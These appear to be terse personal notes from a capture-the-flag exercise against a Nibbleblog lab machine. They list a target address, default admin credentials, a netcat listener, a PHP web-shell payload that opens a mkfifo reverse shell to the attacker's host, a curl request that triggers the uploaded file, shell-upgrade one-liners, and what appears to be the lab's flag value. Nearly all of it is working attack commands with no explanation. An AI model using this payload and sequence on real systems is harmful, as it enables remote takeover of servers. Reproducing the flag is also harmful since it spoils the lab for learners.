#  Gain a foothold on the target and submit the user.txt flag

10.129.200.170

admin:nibbles

nc 10.10.16.5 1234

curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 1234 >/tmp/f"); ?>

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

79c03865431abf47b90ef24b9695e148

http://10.129.200.170/nibbleblog/admin.php